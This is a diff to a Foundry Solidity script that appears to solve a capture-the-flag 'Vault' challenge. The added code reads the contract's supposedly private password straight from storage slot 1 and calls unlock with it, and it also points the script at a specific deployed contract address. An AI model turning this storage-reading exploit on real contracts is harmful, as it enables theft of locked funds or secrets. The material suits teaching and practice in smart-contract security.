@@ -20,7 +20,7 @@ contract VaultScript is Script {
             /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
             attacker = msg.sender;
             /** Setup contract and required init (you may have to modify this section) **/
-            // target = Vault(0x0000000000000000000000000000000000000000); //attach to an existing contract
+            target = Vault(0x57b9334b6A1D3B50d0b1017Be02C0fEd714Bf7a4); //attach to an existing contract:0x0000000000000000000000000000000000000000
         }else{ // local - chainid = 31137
             /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
             deployer = vm.addr(1);
@@ -32,7 +32,7 @@ contract VaultScript is Script {
             vm.deal(attacker, 0.5 ether);
             /** Setup contract and required init (you may have to modify this section) **/
             vm.startBroadcast(deployer);
-            // target = new Vault();
+            target = new Vault("PASSW0rd!@#@!#@!");
             vm.stopBroadcast();
         }
     }
@@ -44,5 +44,12 @@ contract VaultScript is Script {
     function run() public {
         console.log("[Info]");
         console.log("attacker : %s", attacker);
+
+        console .log("[Exploit]");
+        bytes32 password = vm.load(address(target), bytes32(uint256(1)));
+        console.logBytes32(password);
+        vm.broadcast(attacker);
+        target.unlock(password);
+        console.log("locked : %s", target.locked());
     }
 }
